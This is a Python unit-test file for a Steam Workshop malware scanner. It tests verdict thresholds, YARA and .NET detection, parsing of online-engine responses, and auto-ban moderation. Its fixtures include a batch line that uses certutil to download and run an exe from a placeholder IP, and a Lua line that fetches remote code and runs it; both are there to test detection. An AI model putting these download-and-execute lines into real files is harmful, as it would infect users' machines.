"""Unit tests. Run inside the image:
    docker compose run --rm --entrypoint python -v ./tests:/app/tests:ro guard -m pytest -q /app/tests
(or locally with the requirements installed)."""

import json
import zipfile
import io
from pathlib import Path

import pytest

from workshopguard import games, notify, steam, testdata
from workshopguard.scan import dotnet
from workshopguard.scan.engine import Scanners, scan_dir
from workshopguard.scan.model import Finding, verdict_for
from workshopguard.scan.yarascan import Yara

FIXTURES = Path(__file__).parent / "fixtures" / "out"


def test_resolve_games():
    assert games.resolve("plateup").appid == 1599600
    assert games.resolve("BO3").appid == 311210
    assert games.resolve("https://store.steampowered.com/app/1599600/PlateUp/").appid == 1599600
    assert games.resolve("1234567").name == "App 1234567"
    with pytest.raises(ValueError):
        games.resolve("notagame")


def test_verdicts():
    f = lambda sev, file="a.dll", rule=None: Finding("x", sev, rule or f"r.{sev}.{file}", "", file)  # noqa: E731
    assert verdict_for([])[0] == "clean"
    assert verdict_for([f("low")] * 30)[0] == "clean"  # lows never add up to a flag
    assert verdict_for([f("medium", rule="a"), f("medium", rule="b")])[0] == "clean"
    assert verdict_for([f("medium", rule="a"), f("medium", rule="b"), f("medium", rule="c")])[0] == "suspicious"
    assert verdict_for([f("medium", "1.dll", "a"), f("medium", "2.dll", "b"), f("medium", "3.dll", "c")])[0] == "clean"
    assert verdict_for([f("high")])[0] == "suspicious"
    assert verdict_for([f("high"), f("critical")])[0] == "malicious"


def test_byte_array_signature():
    # Assembly.Load(byte[]): default conv, 1 param, returns class token, param szarray of u1
    assert dotnet._takes_byte_array(bytes([0x00, 0x01, 0x12, 0x81, 0x29, 0x1D, 0x05]))
    # Assembly.Load(AssemblyName) from Mono.Cecil
    assert not dotnet._takes_byte_array(bytes.fromhex("000112812912811d"))
    # LoadFile(string)
    assert not dotnet._takes_byte_array(bytes.fromhex("000112790e"))


def test_parse_browse_html():
    payload = {"loaderData": [json.dumps({"queries": [{"queryKey": ["workshop_browse", {"page": 1}], "state": {
        "data": {"total_count": 31, "results": [{"publishedfileid": "123", "creator": "7656", "consumer_appid": 1599600,
                                                  "title": "Mod", "time_updated": 5, "file_size": "42"}]}}}]})]}
    html = f'<script type="application/json" id="valve-ssr-data" nonce="x">{json.dumps(payload)}</script>'
    items, total = steam.parse_browse_html(1599600, html)
    assert total == 31 and items[0].id == "123" and items[0].file_size == 42 and items[0].title == "Mod"
    with pytest.raises(steam.SteamError):
        steam.parse_browse_html(1, "<html></html>")


def test_eicar_is_assembled_correctly():
    e = testdata.eicar()
    assert len(e) == 68 and e.startswith(b"X5O!") and e.endswith(b"H+H*")


def _scan(tmp_path, files: dict, game="bo3"):
    for name, data in files.items():
        p = tmp_path / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_bytes(data)
    return scan_dir(tmp_path, games.resolve(game), Scanners(yara=Yara()))


def test_clean_bo3_item(tmp_path):
    r = _scan(tmp_path, {"zm_mod.ff": b"\x00" * 100, "workshop.json": b"{}", "en_zm_mod.ff": b"x"})
    assert r.verdict == "clean" and r.files_scanned == 3


def test_test_marker_detected(tmp_path):
    testdata.plant(tmp_path)
    r = scan_dir(tmp_path, games.resolve("plateup"), Scanners(yara=Yara()))
    assert r.verdict == "malicious"
    assert "yara.WorkshopGuard_Test_Marker" in {f.rule for f in r.findings}


def test_script_in_zip_and_double_extension(tmp_path):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("inner/run.bat", "@echo off\r\ncertutil -urlcache -f http://203.0.113.9/a.exe a.exe\r\nstart a.exe\r\n")
    r = _scan(tmp_path, {"extras.zip": buf.getvalue(), "readme.txt.exe": b"MZ"})
    rules = {f.rule for f in r.findings}
    assert "yara.WG_Script_Downloader" in rules        # found inside the zip
    assert "files.double_extension" in rules
    assert r.verdict == "malicious"


def test_lua_backdoor(tmp_path):
    r = _scan(tmp_path, {"lua/autorun/x.lua": b'http.Fetch("https://x.invalid/p", function(b) RunString(b) end)'},
              game="gmod")
    assert "yara.WG_Lua_Remote_Code" in {f.rule for f in r.findings}


@pytest.mark.skipif(not (FIXTURES / "plateup").exists(), reason="run tests/build_fixtures.sh first")
def test_fake_stealer_mod_is_malicious():
    r = scan_dir(FIXTURES / "plateup" / "9000000001", games.resolve("plateup"), Scanners(yara=Yara()))
    rules = {f.rule for f in r.findings}
    assert r.verdict == "malicious"
    for expected in ("dotnet.combo.loader", "dotnet.combo.dropper", "dotnet.combo.stealer", "dotnet.combo.worm"):
        assert expected in rules, expected


def test_discord_payload_shape():
    p = notify.build_payload({"appid": 311210, "id": "1", "title": "T", "creator": "7656"}, "BO3", "malicious", 60,
                             [{"severity": "critical", "description": "bad", "file": "a.dll", "rule": "r",
                               "scanner": "x", "evidence": []}], is_test=True, previous="clean", public_url="")
    e = notify.discord_embed(p)["embeds"][0]
    assert e["title"].startswith("[TEST]") and "bad" in e["description"]
    assert any(f["name"] == "Changed" for f in e["fields"])


# --- online engines: response handling, with the HTTP layer faked (no keys needed) ---------------------------

class _Resp:
    def __init__(self, status, body):
        self.status_code, self._body = status, body

    def json(self):
        return self._body

    def raise_for_status(self):
        if self.status_code >= 400:
            import requests
            raise requests.HTTPError(str(self.status_code))


class _Session:
    def __init__(self, get=None, post=None):
        self.headers, self._get, self._post = {}, get, post

    def get(self, *a, **k):
        return self._get

    def post(self, *a, **k):
        return self._post


def test_virustotal_parsing():
    from workshopguard.scan.online import VirusTotal
    vt = VirusTotal("k", per_minute=6000)
    vt.session = _Session(get=_Resp(200, {"data": {"attributes": {"last_analysis_stats": {
        "malicious": 41, "suspicious": 0, "undetected": 20, "harmless": 0}}}}))
    status, f = vt.check("ab" * 32, b"x", "a.dll", "a.dll")
    assert status == "detected" and f.severity == "critical" and "41/61" in f.description
    vt.session = _Session(get=_Resp(404, {}))
    assert vt.check("ab" * 32, b"x", "a.dll", "a.dll") == ("unknown", None)


def test_metadefender_parsing():
    from workshopguard.scan.online import MetaDefender
    md = MetaDefender("k")
    md.t.gap = 0
    md.session = _Session(get=_Resp(200, {"scan_results": {"total_detected_avs": 0, "total_avs": 21}}))
    assert md.check("cd" * 32, b"x", "a.dll", "a.dll") == ("clean", None)
    md.session = _Session(get=_Resp(200, {"scan_results": {"total_detected_avs": 1, "total_avs": 21}}))
    status, f = md.check("cd" * 32, b"x", "a.dll", "a.dll")
    assert status == "detected" and f.severity == "medium"


def test_malwarebazaar_parsing():
    from workshopguard.scan.online import MalwareBazaar
    mb = MalwareBazaar("k")
    mb.session = _Session(post=_Resp(200, {"query_status": "ok", "data": [{"signature": "RedLineStealer"}]}))
    status, f = mb.check("ef" * 32, b"x", "a.dll", "a.dll")
    assert status == "detected" and f.severity == "critical" and "RedLineStealer" in f.description
    mb.session = _Session(post=_Resp(200, {"query_status": "hash_not_found"}))
    assert mb.check("ef" * 32, b"x", "a.dll", "a.dll") == ("unknown", None)


def test_protect_fingerprint_changes(tmp_path):
    from workshopguard.protect import fingerprint
    (tmp_path / "a.dll").write_bytes(b"1")
    before = fingerprint(tmp_path)
    (tmp_path / "b.txt").write_bytes(b"22")
    assert fingerprint(tmp_path) != before


def test_capa_weights():
    from workshopguard.scan.capa_engine import _weigh
    assert _weigh("collection/keylog/hook") == "high"
    assert _weigh("persistence/registry/run") == "high"
    assert _weigh("impact/cryptocurrency") == "low"       # matches words like "Dash" in normal mods
    assert _weigh("load-code/dotnet") is None              # Harmony/MonoMod do this all the time


# --- publisher mode -------------------------------------------------------------------------------------------

class _FakeAPI:
    def __init__(self):
        self.calls = []

    def set_item_ban(self, appid, item_id, banned, reason):
        self.calls.append(("item", appid, item_id, banned))
        return {}

    def set_uploader_ban(self, appid, steamid, days, reason):
        self.calls.append(("uploader", appid, steamid, days))
        return {}


class _Notifier:
    def moderation(self, *a):
        pass


def _moderator(tmp_path, auto_ban="confirmed", apps=(311210,), ban_uploader=False):
    from types import SimpleNamespace
    from workshopguard.db import DB
    from workshopguard.moderation import Moderator
    cfg = SimpleNamespace(publisher_key="k", publisher_apps=set(apps), auto_ban=auto_ban, ban_uploader=ban_uploader,
                          uploader_ban_days=0, uploader_ban_reason="r")
    db = DB(tmp_path / "t.db")
    m = Moderator(cfg, db, _Notifier())
    m.api = _FakeAPI()
    return db, m


def _seen(db, appid, id_, creator="7656"):
    db.upsert_seen(steam.Item(appid, id_, title=f"Item {id_}", creator=creator, time_updated=1))


CLAM = {"rule": "clamav.detected", "severity": "critical", "description": "ClamAV detected X", "file": "a.dll"}
HEUR = {"rule": "dotnet.combo.dropper", "severity": "critical", "description": "dropper", "file": "a.dll"}


def test_auto_ban_needs_confirmation(tmp_path):
    db, m = _moderator(tmp_path, "confirmed")
    _seen(db, 311210, "1")
    assert m.after_scan(311210, {"id": "1", "creator": "7656"}, "malicious", [HEUR], False) is None
    assert m.api.calls == []  # heuristics alone: left for a person
    assert m.after_scan(311210, {"id": "1", "creator": "7656"}, "malicious", [HEUR, CLAM], False) == "banned"
    assert m.api.calls == [("item", 311210, "1", True)]
    assert db.item(311210, "1")["moderation"] == "banned"


def test_auto_ban_never_touches_tests_other_apps_or_cleared(tmp_path):
    db, m = _moderator(tmp_path, "malicious")
    _seen(db, 311210, "1")
    _seen(db, 1599600, "2")
    _seen(db, 311210, "3")
    m.clear(311210, "3", by="test")
    assert m.after_scan(311210, {"id": "1"}, "malicious", [CLAM], True) is None        # planted test files
    assert m.after_scan(1599600, {"id": "2"}, "malicious", [CLAM], False) is None      # not in PUBLISHER_APPS
    assert m.after_scan(311210, {"id": "3"}, "malicious", [CLAM], False) is None       # a person cleared it
    assert m.api.calls == []


def test_auto_ban_off_by_default_and_uploader_ban(tmp_path):
    db, m = _moderator(tmp_path, "off")
    _seen(db, 311210, "1")
    assert m.after_scan(311210, {"id": "1", "creator": "7656"}, "malicious", [CLAM], False) is None
    (tmp_path / "b").mkdir()
    db, m = _moderator(tmp_path / "b", "confirmed", ban_uploader=True)
    _seen(db, 311210, "1")
    m.after_scan(311210, {"id": "1", "creator": "7656"}, "malicious", [CLAM], False)
    assert ("uploader", 311210, "7656", 3650) in m.api.calls


def test_blocklist_never_blocks_shared_libraries(tmp_path):
    import json as _j
    db, m = _moderator(tmp_path)
    harmony, payload = "a" * 64, "b" * 64
    _seen(db, 311210, "good")
    db.x("UPDATE items SET status='scanned', verdict='clean', details=? WHERE id='good'",
         _j.dumps({"sha256": {"0Harmony.dll": harmony}}))
    _seen(db, 311210, "bad")
    db.x("UPDATE items SET status='scanned', verdict='malicious', details=?, findings=? WHERE id='bad'",
         _j.dumps({"sha256": {"0Harmony.dll": harmony, "Evil.dll": payload, "readme.txt": "c" * 64}}),
         _j.dumps([{**HEUR, "file": "Evil.dll"}, {**HEUR, "file": "0Harmony.dll", "severity": "medium"}]))
    m.ban_item(311210, "bad", "test", by="test")
    from workshopguard.moderation import blocklist
    bl = blocklist(db, 311210)
    assert [i["id"] for i in bl["items"]] == ["bad"]
    assert bl["sha256"] == [payload]   # not Harmony (ships in a clean mod), not the unflagged readme
